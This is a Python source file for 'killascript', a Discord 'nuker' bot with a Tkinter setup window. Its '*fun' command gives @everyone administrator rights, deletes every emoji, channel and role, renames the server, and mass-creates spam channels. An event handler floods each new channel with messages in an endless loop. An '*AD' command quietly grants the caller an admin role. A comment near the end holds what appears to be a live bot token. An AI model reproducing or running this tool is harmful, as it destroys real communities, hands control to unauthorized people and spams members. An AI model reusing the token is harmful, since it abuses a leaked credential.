# packages
import discord
from discord.ext import commands
import tkinter as tk
from tkinter import messagebox
from PIL import ImageTk

prefix = "*"


UI = tk.Tk()
UI.title("killascript | prefix: *")
UI.iconbitmap("killaimage.ico")

app_width = 500
app_height = 550

screenw = UI.winfo_screenwidth()
screenh = UI.winfo_screenheight()
x = (screenw / 2) - (app_width / 2)
y = (screenh / 2) - (app_height / 2)

UI.geometry(f'{app_width}x{app_height}+{int(x)}+{int(y)}')

main = tk.Frame(master=UI)
main.pack(fill="both", expand=True)
banner = ImageTk.PhotoImage(file="killaimagebanner.png")
Line = ImageTk.PhotoImage(file="killaimageline.png")



def startup():
    TKN: str = UI1.TOKE.get()
    NME: str = UI1.name.get()
    SPM: str = UI1.spmmsg.get()
    SPC: str = UI1.spamc.get()

    if TKN == "":
        messagebox.showinfo("killascript | prefix: *", "Please fill in all fields!")
        return

    if NME == "":
        messagebox.showinfo("killascript | prefix: *", "Please fill in all fields!")
        return

    if SPM == "":
        messagebox.showinfo("killascript | prefix: *", "Please fill in all fields!")
        return

    if SPC == "":
        messagebox.showinfo("killascript | prefix: *", "Please fill in all fields!")
        return

    else:
        pass


    messagebox.showinfo("killascript | prefix: *", "Everything is set, Please go to the terminal for further instruction")

    UI.destroy()

    intents = discord.Intents.all()
    Bot = commands.Bot(command_prefix=prefix,
                       help_command=None, intents=intents)

    @Bot.event
    async def on_ready():
        print(f"The console is now online for nuker: {Bot.user}")
        print(f"Bot Prefix: {prefix}")
        print("---commands---")
        print(f"{prefix}fun - Nuke command")
        print(f"{prefix}AD - Gives person who runs command admin")

    @Bot.command(name="fun")
    async def fun(ctx):

        await ctx.message.delete()  # GIVES @EVERYONE ADMIN
        g = ctx.guild
        rle = discord.utils.get(g.roles, name="@everyone")
        try:
            await rle.edit(permissions=discord.Permissions.all())
            print(f"[+] GRANTED '@everyone' ADMIN PERMS")
        except Exception as e:
            print(f"[-] COULD NOT GRANT '@everyone' ADMIN PERMS: {e}")# grants @everyone admin perms

        for eji in list(g.emojis):
            try:
                await eji.delete()
                print(f"[+] EMOJI {eji} DELETED")
            except Exception as e:
                print(f"[-] DELETE EMOJI ERROR: {e}")# deletes emojis

        for chan in g.channels:
            try:
                await chan.delete()
                print(f"[+] CHANNEL {chan} DELETED")
            except Exception as e:
                print(f"[-] DELETE CHANNEL ERROR: {e}")# deletes channels
            else:
                pass

        try:
            await ctx.guild.edit(name=NME)
            print(f"[+] RENAMED SERVER: {NME}")
        except Exception as e:
            print(f"[-] RENAME SERVER ERROR: {e}")# renames server

        for role in g.roles:
            try:
                await role.delete()
                print(f"[+] ROLE {role} DELETED")
            except Exception as e:
                print(f"[-] DELETE ROLE ERROR: {e}")# deletes roles
            else:
                pass

        try:
            amount = 500
            for i in range(amount):
                await g.create_text_channel(SPC)
                print(f"[+] CREATED CHANNEL")
                await g.create_text_channel(SPC)
                print(f"[+] CREATED CHANNEL")
        except Exception as e:
            print(f"[-] CREATE CHANNEL ERROR: {e}")# creates spam channels



    @Bot.command(name="AD")  # CREATES PRIVATE ROLE WITH ADMIN PERMS FOR PERSON WHO RUNS COMMAND
    async def AD(ctx):
        await ctx.message.delete()
        g = ctx.guild
        auth = ctx.message.author
        try:
            role = await g.create_role(name=".", permissions=discord.Permissions(8))
            await auth.add_roles(role)
            print(f"[+] GIVEN ADMIN TO {auth}")
        except Exception as e:
            print(f"[-] COULD NOT GIVE USER {auth} ADMIN: {e}")

    @Bot.event  # SENDS SPAM MESSAGES TO SPAM CHANNELS
    async def on_guild_channel_create(channel):
        while True:
            await channel.send(SPM)
            print(f"[+] SPAM MESSAGE SENT")

    @Bot.event
    async def on_command_error(ctx, error):
        if isinstance(error, commands.CommandNotFound):
            print("[-] Error: Command not found")# command not found eroor

    @Bot.event
    async def on_command_error(ctx, error):
        if isinstance(error, commands.BotMissingRole):
            print("[-] Error: Command not found")# bot doesn't have permissions error

    Bot.run(TKN)

class UI1():

    # images

    uibanner = tk.Label(master=main, image=banner, borderwidth=1)
    uibanner.place(y=30)

    lne = tk.Label(master=main, image=Line, borderwidth=1)
    lne.place(x=-70, y=150)


    # labels

    spmlabel = tk.Label(master=main, text="Spam Message:", font=("Arial", 10))
    spmlabel.place(x=14, y=180)


    spclabel = tk.Label(master=main, text="Spam Channel:", font=("Arial", 10))
    spclabel.place(x=269, y=180)

    TKNlabel = tk.Label(master=main, text="Bot Token:", font=("Arial", 10))
    TKNlabel.place(x=14, y=380)

    sernmelabel = tk.Label(master=main, text="Rename Server:", font=("Arial", 10))
    sernmelabel.place(x=14, y=280)


    # entry fields

    spmmsg = tk.Entry(master=main, bg="light grey", borderwidth=2, width=35)
    spmmsg.place(x=15, y=200)

    spamc = tk.Entry(master=main, bg="light grey", borderwidth=2, width=35)
    spamc.place(x=270, y=200)

    name = tk.Entry(master=main, bg="light grey", borderwidth=2, width=35)
    name.place(x=15, y=300)

    TOKE = tk.Entry(master=main, bg="light grey", borderwidth=2, width=70)
    TOKE.place(x=15, y=400)


    # buttons

    confirmbut = tk.Button(master=main, bg="#cccccc", text="confirm", font=("Arial", 16), borderwidth=2, width=15, command=startup)
    confirmbut.place(x=150, y=500)

# ODk3MzU3NDk0Mjk1MzQ3MjIx.G3iAQ6.IK3e56tN8wnVWwXLU0u2oFZROVATVYHvL2Duv4

UI.mainloop()
